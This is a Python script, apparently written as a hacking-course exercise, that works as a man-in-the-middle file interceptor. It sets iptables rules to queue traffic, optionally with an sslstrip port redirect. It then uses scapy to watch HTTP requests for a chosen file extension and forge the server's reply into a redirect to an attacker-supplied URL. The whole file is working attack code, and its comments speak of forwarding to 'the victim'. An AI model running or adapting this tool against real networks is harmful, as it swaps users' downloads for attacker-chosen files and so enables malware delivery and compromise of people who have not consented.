#!/usr/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse
import os
import sys

ack_list = []


def is_not_root():
    return os.geteuid() != 0


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-e", "--extension", dest="extension", help="Specify a file extension"
    )
    parser.add_argument(
        "-d",
        "--destination",
        dest="destination",
        help="Destination (sslstrip, forward, local)",
    )
    parser.add_argument("-u", "--url", dest="url", help="Specify a replace url")
    values = parser.parse_args()
    if not values.extension:
        parser.error(
            "[-] Please specify a file extension, use --help for more information"
        )
    if not values.destination:
        parser.error(
            "[-] Please specify a destination (sslstrip, forward, local), use --help for more information"
        )
    if not values.url:
        parser.error(
            "[-] Please specify a replace url, use --help for more information"
        )
    return values


def apache_start():
    print("Starting apache2 service...")
    try:
        subprocess.check_output(["service", "apache2", "start"])
    except subprocess.CalledProcessError:
        print("Installing and starting apache2 service...")
        subprocess.call("apt-get install apache2 -y", shell=True)
        subprocess.call("service apache2 start", shell=True)
    print("Done.")


def run_queue(destination, qnum):
    if destination == "forward":
        subprocess.call(
            "iptables -I FORWARD -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    elif destination == "sslstrip":
        subprocess.call(
            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "sudo iptables -t nat -A PREROUTING -p tcp"
            " --destination-port 80 -j REDIRECT --to-port 10000",
            shell=True,
        )
    elif destination == "local":
        subprocess.call(
            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    else:
        print("[-] Unknown destination")

    # Create netfilterqueue instance
    queue = netfilterqueue.NetfilterQueue()
    # Bind queue number 0 (queue zero in iptables)
    queue.bind(qnum, process_packet)
    # Run the queue
    queue.run()


def restore():
    subprocess.call("iptables --flush", shell=True)
    subprocess.call("service apache2 stop", shell=True)
    print("[+] Quitting.")


def forge_packet(packet, load):
    packet[scapy.Raw].load = load
    # Packet corruption can be detected using the checksum and
    # len fields. By deleting these scapy generates new entries.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # Convert the NetfilterQueue packet into a scapy packet.
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())

    # HTTP data is placed in the Raw layer.
    if scapy_packet.haslayer(scapy.Raw):
        # tcp dport = destination (request)

        if (
            scapy_packet[scapy.TCP].dport == 80
            or scapy_packet[scapy.TCP].dport == 10000
        ):
            print(str(scapy_packet[scapy.Raw].load))
            print(options.extension)
            # If target extension is in the load, wait for
            # the response to the package.
            if options.extension in str(
                scapy_packet[scapy.Raw].load
            ) and options.url not in str(scapy_packet[scapy.Raw].load):
                print("[+] {} request".format(options.extension))
                ack_list.append(scapy_packet[scapy.TCP].ack)

        # tcp sport = source (response)
        elif (
            scapy_packet[scapy.TCP].sport == 80
            or scapy_packet[scapy.TCP].sport == 10000
        ):
            # If it is a response we have been waiting for
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing Files")
                forged_packet = forge_packet(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(
                        options.url
                    ),
                )
                # Set the forged scapy packet payload to the
                # NetfilterQueue packet.
                packet.set_payload(bytes(forged_packet))

    # Forward to the victim.
    packet.accept()


# Check whether we're root
if is_not_root():
    sys.exit("[-] This script requires superuser privileges.")
options = get_args()
try:
    apache_start()
    run_queue(options.destination, 0)
except KeyboardInterrupt:
    print("[+] \nDetected CTRL+C ... Restoring normal connections ...")
    restore()
